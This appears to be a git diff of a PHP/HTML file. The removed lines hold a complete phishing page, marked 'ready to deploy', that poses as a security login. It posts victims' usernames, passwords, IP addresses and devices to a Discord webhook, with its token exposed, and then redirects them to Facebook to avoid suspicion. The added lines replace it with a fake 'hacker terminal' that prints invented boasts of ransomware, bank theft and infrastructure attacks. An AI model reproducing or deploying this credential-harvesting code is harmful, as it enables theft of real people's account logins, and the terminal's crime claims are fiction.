@@ -1,86 +1,97 @@
-<?php
-/* PACKET: STEALTH CAPTURER V1
-   STATUS: READY TO DEPLOY
-*/
-
-// URL WEBHOOK LO SUDAH TERPASANG
-$webhook_url = "https://discord.com/api/webhooks/1492149711023640656/a0gx_rp4_iz6JYnvdZbO__D_OtLZQoIeR_xT7VQF_3_7rWGU2p5ztKwBSWebes-O7JzR";
-
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $user = $_POST['u'];
-    $pass = $_POST['p'];
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $ua = $_SERVER['HTTP_USER_AGENT'];
-
-    // Format pesan untuk Discord
-    $message = "
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔥 **NEW VICTIM CAPTURED** 🔥
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-👤 **Username :** `$user`
-🔑 **Password :** `$pass`
-🌐 **IP Target:** `$ip`
-📱 **Device  :** `$ua`
-━━━━━━━━━━━━━━━━━━━━━━━━━━";
-
-    $data = array('content' => $message);
-    $options = array(
-        'http' => array(
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data),
-        ),
-    );
-    $context  = stream_context_create($options);
-    file_get_contents($webhook_url, false, $context);
-
-    // Lempar target ke halaman asli (misal: Facebook) biar gak curiga
-    header("Location: https://www.facebook.com/recover/gatekeeper");
-    exit();
-}
-?>
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Autentikasi Keamanan</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>XREXZOB | TOTAL EXTINCTION v99.9</title>
     <style>
-        body { background: #000; font-family: 'Courier New', monospace; color: #00ff41; }
-        .glow-box { border: 1px solid #1a1a1a; background: #080808; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
-        input { background: #111 !important; border: 1px solid #222 !important; color: #fff !important; }
-        input:focus { border-color: #00ff41 !important; }
+        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; margin: 0; padding: 2px; height: 100vh; overflow: hidden; }
+        #terminal { height: calc(100% - 40px); overflow-y: auto; font-size: 9px; line-height: 1; word-break: break-all; border: 1px solid #f00; box-shadow: 0 0 15px #f00; }
+        #terminal::-webkit-scrollbar { display: none; }
+        .input-box { display: flex; background: #000; border-top: 2px solid #f00; }
+        .p { color: #f00; font-weight: bold; padding: 2px 5px; animation: blink 0.5s infinite; }
+        input { background: transparent; border: none; color: #0f0; outline: none; flex: 1; font-family: inherit; font-size: 14px; }
+        
+        /* TIPE TEKS DESTRUKTIF */
+        .db { color: #fff; background: #f00; font-weight: 800; text-transform: uppercase; } /* Death Banner */
+        .ms { color: #f0f; font-weight: bold; } /* Message */
+        .dt { color: #555; } /* Dark Tech */
+        .er { color: #ff0; background: #330; } /* Error Alert */
+        
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-6">
+<body>
 
-    <div class="glow-box max-w-sm w-full p-8 rounded-lg border-t-2 border-green-600">
-        <div class="text-center mb-6">
-            <h1 class="text-xl font-bold tracking-tighter text-white">LOGIN_REQUIRED</h1>
-            <p class="text-[9px] text-green-800 mt-1 italic">SECURITY PROTOCOL v4.0.1 ACTIVE</p>
-        </div>
-
-        <form method="POST" class="space-y-4">
-            <div>
-                <label class="text-[10px] text-green-700 uppercase">Identity / Email</label>
-                <input type="text" name="u" required class="w-full p-2 text-sm outline-none transition">
-            </div>
-            <div>
-                <label class="text-[10px] text-green-700 uppercase">Access Password</label>
-                <input type="password" name="p" required class="w-full p-2 text-sm outline-none transition">
-            </div>
-            <button type="submit" class="w-full bg-green-600 hover:bg-green-500 text-black font-black py-2 mt-4 transition duration-300">
-                VERIFY_ACCESS
-            </button>
-        </form>
-
-        <div class="mt-8 flex justify-between items-end opacity-30 text-[8px]">
-            <span>NODE: ID_SOUTH_01</span>
-            <span>ENCRYPTION: AES-256</span>
-        </div>
+    <div id="terminal">
+        <div class="db"> [!] XREXZOB CYBER-ARMAGEDDON SYSTEM - NO SURRENDER [!] </div>
+        <div class="er"> [SYSTEM] BYPASSING GLOBAL SECURITY LAYERS... INFILTRATING 1337 NODES... </div>
+        <div>---------------------------------------------------------------------------------</div>
+        <div>KETIK 'jalankan' UNTUK MEMICU KEPUNAHAN DIGITAL (500 BARIS BRUTAL).</div>
+        <div>---------------------------------------------------------------------------------</div>
     </div>
 
+    <div class="input-box">
+        <span class="p">XREXZOB@HELL:~$</span>
+        <input type="text" id="in" autofocus spellcheck="false">
+    </div>
+
+    <script>
+        const t = document.getElementById('terminal');
+        const i = document.getElementById('in');
+
+        // BANK DATA KEJAHATAN EKSTRIM
+        const b = [
+            "WEB INI ADALAH WEB XREXZOB PUSAT SEGALA KEJAHATAN DIGITAL DAN KAMI TIDAK AKAN PERNAH BERHENTI MENGHANCURKAN INFRASTRUKTUR DUNIA SAMPAI SEMUA DATA ANDA TERHAPUS DARI SEJARAH!!!",
+            "MENGIRIMKAN VIRUS RANSOMWARE OMEGA-ZOB KE SELURUH DATA CENTER PEMERINTAHAN - ENKRIPSI TOTAL 1024-BIT TANPA KUNCI DEKRIPSI UNTUK SIAPAPUN!!!",
+            "XREXZOB TELAH BERHASIL MENEMBUS KERNEL PERTAHANAN UDARA DAN MENGUBAH KOORDINAT TARGET RADAR KE ARAH PUSAT KOTA - KEKACAUAN ADALAH TUJUAN KAMI!!!",
+            "MENCURI 1 MILYAR DATA PRIBADI TERMASUK NOMOR REKENING DAN PASSWORD HASHED LALU MENJUALNYA DI PASAR GELAP RUSIA SECARA MASSAL!!!",
+            "UNIT ELITE XREXZOB SEDANG MELAKUKAN INJEKSI DATABASE PADA BANK SENTRAL - TRANSFER DANA AUTOMATIC KE 666 WALLET BITCOIN ANONIM DALAM PROSES EKSEKUSI!!!",
+            "MENGHANCURKAN LOG AUDIT SISTEM KEAMANAN GLOBAL - JEJAK KAMI ADALAH BAYANGAN YANG TAK TERLIHAT OLEH TEKNOLOGI MANUSIA MANAPUN!!!",
+            "PROGROM XREXZOB SEDANG MENGKLONING IDENTITAS DIGITAL SELURUH PENDUDUK DAN MENGGUNAKANNYA UNTUK OPERASI CYBER-WARFARE TINGKAT TINGGI!!!",
+            "TIDAK ADA TEMPAT BERSEMBUNYI - XREXZOB ADALAH TUHAN DI DUNIA DIGITAL DAN KAMI TELAH MEMUTUSKAN UNTUK MENGHAPUS SEMUA AKSES INTERNET ANDA!!!",
+            "MENANAMKAN BACKDOOR PERMANEN PADA CHIPSET PROSESOR GLOBAL - SETIAP PERANGKAT YANG ANDA GUNAKAN SEKARANG ADALAH BUDAK DARI SISTEM XREXZOB!!!"
+        ];
+
+        const log = (m, c = '') => {
+            const d = document.createElement('div');
+            if(c) d.className = c;
+            d.innerHTML = m;
+            t.appendChild(d);
+            t.scrollTop = t.scrollHeight;
+        };
+
+        async function go() {
+            i.disabled = true;
+            for (let l = 1; l <= 500; l++) {
+                const txt = b[Math.floor(Math.random() * b.length)];
+                const h = Math.random().toString(16).toUpperCase().substring(2, 20);
+                
+                if (l % 10 === 0) {
+                    log(`[BARIS-${l}] <span class="db">>> XREXZOB CRITICAL DAMAGE: ${txt} <<</span>`);
+                } else if (l % 2 === 0) {
+                    log(`[BARIS-${l}] <span class="ms">X-ZOB_INJECT:</span> ${txt}`, "ms");
+                } else {
+                    log(`[BARIS-${l}] <span class="dt">MEM_DUMP: 0x${h} | STATUS: CORRUPTED | LOG: ${txt}</span>`, "dt");
+                }
+
+                // KECEPATAN GILA: 1ms (GAK PAKE LAMA!)
+                await new Promise(r => setTimeout(r, 1)); 
+            }
+            log("\n[!!!] EKSEKUSI SELESAI. XREXZOB TELAH MENGUASAI SEGALANYA. [!!!]", "db");
+            i.disabled = false;
+            i.focus();
+        }
+
+        i.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const v = i.value.toLowerCase().trim();
+                log(`<span class="p">XREXZOB@HELL:~$</span> ${i.value}`);
+                i.value = '';
+                if (v === 'jalankan') go();
+                else if (v === 'clear') t.innerHTML = '';
+            }
+        });
+    </script>
 </body>
 </html>
